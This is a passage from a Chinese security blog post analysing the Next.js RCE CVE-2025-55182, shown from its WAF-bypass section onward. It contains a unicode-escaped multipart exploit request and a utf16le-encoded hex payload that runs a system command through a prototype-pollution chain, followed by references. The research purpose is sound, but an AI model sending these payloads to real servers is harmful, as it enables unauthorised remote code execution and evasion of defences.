u0052\u0045\u0043\u0054\u0027\u0029\u002C\u007B\u0064\u0069\u0067\u0065\u0073\u0074\u003A\u0020\u0060\u004E\u0045\u0058\u0054\u005F\u0052\u0045\u0044\u0049\u0052\u0045\u0043\u0054\u003B\u0070\u0075\u0073\u0068\u003B\u002F\u006C\u006F\u0067\u0069\u006E\u003F\u0061\u003D\u0024\u007B\u0072\u0065\u0073\u007D\u003B\u0033\u0030\u0037\u003B\u0060\u007D\u0029\u003B&quot;,&quot;\u005F\u0063\u0068\u0075\u006E\u006B\u0073&quot;:&quot;\u0024\u0051\u0032&quot;,&quot;\u005F\u0066\u006F\u0072\u006D\u0044\u0061\u0074\u0061&quot;:&#123;&quot;\u0067\u0065\u0074&quot;:&quot;\u0024\u0031\u003A\u0063\u006F\u006E\u0073\u0074\u0072\u0075\u0063\u0074\u006F\u0072\u003A\u0063\u006F\u006E\u0073\u0074\u0072\u0075\u0063\u0074\u006F\u0072&quot;&#125;&#125;&#125;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">&quot;$@0&quot;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;2&quot;</span><br><span class="line"></span><br><span class="line">[]</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad--</span><br></pre></td></tr></table></figure>

<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/40.png" class="" title="image-20251214202717985">

<p>所有双引号中的内容都是可以用unicode替代的。</p>
<h3 id="utf16-encoding"><a href="#utf16-encoding" class="headerlink" title="utf16 encoding"></a>utf16 encoding</h3><p>解析 multipart&#x2F;form-data 的过程是由 busboy 来完成的。调试发现 busboy 会通过 getDecoder 函数来提取 charset 对应的编码方式，然后对传递过来的数据包进行解码，并转发给 ReAct 进行后续处理。</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/50.png" class="" title="image-20251214202855546">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">function getDecoder(e) &#123;</span><br><span class="line">                            let i;</span><br><span class="line">                            for (; ; )</span><br><span class="line">                                switch (e) &#123;</span><br><span class="line">                                case &quot;utf-8&quot;:</span><br><span class="line">                                case &quot;utf8&quot;:</span><br><span class="line">                                    return t.utf8;</span><br><span class="line">                                case &quot;latin1&quot;:</span><br><span class="line">                                case &quot;ascii&quot;:</span><br><span class="line">                                case &quot;us-ascii&quot;:</span><br><span class="line">                                case &quot;iso-8859-1&quot;:</span><br><span class="line">                                case &quot;iso8859-1&quot;:</span><br><span class="line">                                case &quot;iso88591&quot;:</span><br><span class="line">                                case &quot;iso_8859-1&quot;:</span><br><span class="line">                                case &quot;windows-1252&quot;:</span><br><span class="line">                                case &quot;iso_8859-1:1987&quot;:</span><br><span class="line">                                case &quot;cp1252&quot;:</span><br><span class="line">                                case &quot;x-cp1252&quot;:</span><br><span class="line">                                    return t.latin1;</span><br><span class="line">                                case &quot;utf16le&quot;:</span><br><span class="line">                                case &quot;utf-16le&quot;:</span><br><span class="line">                                case &quot;ucs2&quot;:</span><br><span class="line">                                case &quot;ucs-2&quot;:</span><br><span class="line">                                    return t.utf16le;</span><br><span class="line">                                case &quot;base64&quot;:</span><br><span class="line">                                    return t.base64;</span><br><span class="line">                                default:</span><br><span class="line">                                    if (void 0 === i) &#123;</span><br><span class="line">                                        i = !0,</span><br><span class="line">                                        e = e.toLowerCase();</span><br><span class="line">                                        continue</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    return t.other.bind(e)</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure>

<p>比如，可以利用 utf16le 这种编码实现 Bypass：</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/41.png" class="" title="image-20251214210548392">

<p>我们编码后形成一个hex文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建包含要插入的 Hex 的文件</span></span><br><span class="line">hex_data = <span class="string">&quot;7B00 2200 7400 6800 6500 6E00 2200 3A00 2200 2400 3100 3A00 5F00 5F00 7000 7200 6F00 7400 6F00 5F00 5F00 3A00 7400 6800 6500 6E00 2200 2C00 2200 7300 7400 6100 7400 7500 7300 2200 3A00 2200 7200 6500 7300 6F00 6C00 7600 6500 6400 5F00 6D00 6F00 6400 6500 6C00 2200 2C00 2200 7200 6500 6100 7300 6F00 6E00 2200 3A00 2D00 3100 2C00 2200 7600 6100 6C00 7500 6500 2200 3A00 2200 7B00 5C00 2200 7400 6800 6500 6E00 5C00 2200 3A00 5C00 2200 2400 4200 3100 3300 3300 3700 5C00 2200 7D00 2200 2C00 2200 5F00 7200 6500 7300 7000 6F00 6E00 7300 6500 2200 3A00 7B00 2200 5F00 7000 7200 6500 6600 6900 7800 2200 3A00 2200 7600 6100 7200 2000 7200 6500 7300 3D00 7000 7200 6F00 6300 6500 7300 7300 2E00 6D00 6100 6900 6E00 4D00 6F00 6400 7500 6C00 6500 2E00 7200 6500 7100 7500 6900 7200 6500 2800 2700 6300 6800 6900 6C00 6400 5F00 7000 7200 6F00 6300 6500 7300 7300 2700 2900 2E00 6500 7800 6500 6300 5300 7900 6E00 6300 2800 2700 7700 6800 6F00 6100 6D00 6900 2700 2900 2E00 7400 6F00 5300 7400 7200 6900 6E00 6700 2800 2900 2E00 7400 7200 6900 6D00 2800 2900 3B00 3B00 7400 6800 7200 6F00 7700 2000 4F00 6200 6A00 6500 6300 7400 2E00 6100 7300 7300 6900 6700 6E00 2800 6E00 6500 7700 2000 4500 7200 7200 6F00 7200 2800 2700 4E00 4500 5800 5400 5F00 5200 4500 4400 4900 5200 4500 4300 5400 2700 2900 2C00 7B00 6400 6900 6700 6500 7300 7400 3A00 2000 6000 4E00 4500 5800 5400 5F00 5200 4500 4400 4900 5200 4500 4300 5400 3B00 7000 7500 7300 6800 3B00 2F00 6C00 6F00 6700 6900 6E00 3F00 6100 3D00 2400 7B00 7200 6500 7300 7D00 3B00 3300 3000 3700 3B00 6000 7D00 2900 3B00 2200 2C00 2200 5F00 6300 6800 7500 6E00 6B00 7300 2200 3A00 2200 2400 5100 3200 2200 2C00 2200 5F00 6600 6F00 7200 6D00 4400 6100 7400 6100 2200 3A00 7B00 2200 6700 6500 7400 2200 3A00 2200 2400 3100 3A00 6300 6F00 6E00 7300 7400 7200 7500 6300 7400 6F00 7200 3A00 6300 6F00 6E00 7300 7400 7200 7500 6300 7400 6F00 7200 2200 7D00 7D00 7D00&quot;</span>  <span class="comment"># Hello World</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;insert.hex&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>.fromhex(hex_data.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)))</span><br></pre></td></tr></table></figure>

<p>然后在raw界面进行<code>paste from file</code>来插入！</p>
<img src="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/42.png" class="" title="image-20251214210535096">



<h3 id="badcase-base64-encoding"><a href="#badcase-base64-encoding" class="headerlink" title="badcase: base64 encoding"></a><strong>badcase: base64 encoding</strong></h3><p>我不会。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://wx.zsxq.com/group/2212251881/topic/45811881255141858">由于next.js在解析mul…-知识星球</a></p>
<p><a target="_blank" rel="noopener" href="https://wx.zsxq.com/group/2212251881/topic/45811858541418158">调试分析CVE-2025-55…-知识星球</a></p>
<p><a target="_blank" rel="noopener" href="https://articles.zsxq.com/id_u0ewlbl1wh82.html">React2Shell 分析总结</a></p>
<p><a target="_blank" rel="noopener" href="https://keenlab.tencent.com/zh/2025/12/08/2025-CVE-2025-55182/">https://keenlab.tencent.com/zh/2025/12/08/2025-CVE-2025-55182/</a></p>
<p><a target="_blank" rel="noopener" href="https://wx.zsxq.com/topic/45811881148251228">https://wx.zsxq.com/topic/45811881148251228</a></p>
<p><a target="_blank" rel="noopener" href="https://articles.zsxq.com/id_zh3w9fe50uma.html">https://articles.zsxq.com/id_zh3w9fe50uma.html</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About me</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/categories/">categories</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%BC%80%E5%A7%8B"><span class="toc-number">1.</span> <span class="toc-text">写在最开始</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E8%B0%83%E5%9C%B0%E7%8B%B1"><span class="toc-number">2.1.</span> <span class="toc-text">回调地狱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Promise"><span class="toc-number">2.2.</span> <span class="toc-text">Promise</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1Promise%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.3.</span> <span class="toc-text">如何设计Promise对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#async%E5%92%8Cawait%E5%BC%82%E6%AD%A5"><span class="toc-number">2.4.</span> <span class="toc-text">async和await异步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thenable%E7%9A%84%E7%94%B1%E6%9D%A5"><span class="toc-number">2.5.</span> <span class="toc-text">Thenable的由来</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%BE%97%E5%BF%85%E6%9C%89%E5%A4%B1"><span class="toc-number">2.6.</span> <span class="toc-text">有得必有失</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E8%B0%83%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">开始调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RSC%E6%98%AF%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84"><span class="toc-number">4.</span> <span class="toc-text">RSC是如何解析数据包的</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSR-RSC"><span class="toc-number">4.1.</span> <span class="toc-text">SSR &amp; RSC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Actions-Flight%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.2.</span> <span class="toc-text">Server Actions &amp; Flight协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="toc-number">6.</span> <span class="toc-text">漏洞触发流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9BWAF"><span class="toc-number">7.</span> <span class="toc-text">一些WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#base64-bypass"><span class="toc-number">7.1.</span> <span class="toc-text">base64 bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unicode-bypass"><span class="toc-number">7.2.</span> <span class="toc-text">unicode bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#utf16-encoding"><span class="toc-number">7.3.</span> <span class="toc-text">utf16 encoding</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#badcase-base64-encoding"><span class="toc-number">7.4.</span> <span class="toc-text">badcase: base64 encoding</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">8.</span> <span class="toc-text">参考文章</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&text=CVE-2025-55182-Next.js无条件RCE"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&title=CVE-2025-55182-Next.js无条件RCE"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&is_video=false&description=CVE-2025-55182-Next.js无条件RCE"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2025-55182-Next.js无条件RCE&body=Check out this article: http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&title=CVE-2025-55182-Next.js无条件RCE"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&title=CVE-2025-55182-Next.js无条件RCE"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&title=CVE-2025-55182-Next.js无条件RCE"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&title=CVE-2025-55182-Next.js无条件RCE"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&name=CVE-2025-55182-Next.js无条件RCE&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/&t=CVE-2025-55182-Next.js无条件RCE"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        
<footer id="footer">
    <div class="footer-left">
        Copyright ©
        
        
        2024-2025
        Meteor_Kai
        <br>
        <a href="https://www.dkdun.cn/" target="_blank">DK盾</a>
    </div>
    
    <div class="footer-right">
        <nav>
            <ul>
                <!--
                --><li><a href="/">Home</a></li><!--
                --><!--
                --><li><a href="/about/">About me</a></li><!--
                --><!--
                --><li><a href="/archives/">Writing</a></li><!--
                --><!--
                --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
                --><!--
                --><li><a href="/search/">Search</a></li><!--
                --><!--
                --><li><a href="/categories/">categories</a></li><!--
                --><!--
                --><li><a href="/tags/">tags</a></li><!--
                --><!--
                --><li><a href="/links/">links</a></li><!--
                -->
            </ul>
            <ul>
                
                <!-- 不蒜子统计 -->
                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
                <span class="post-meta-divider">|</span>
                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
                
            </ul>
        </nav>
    </div>
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
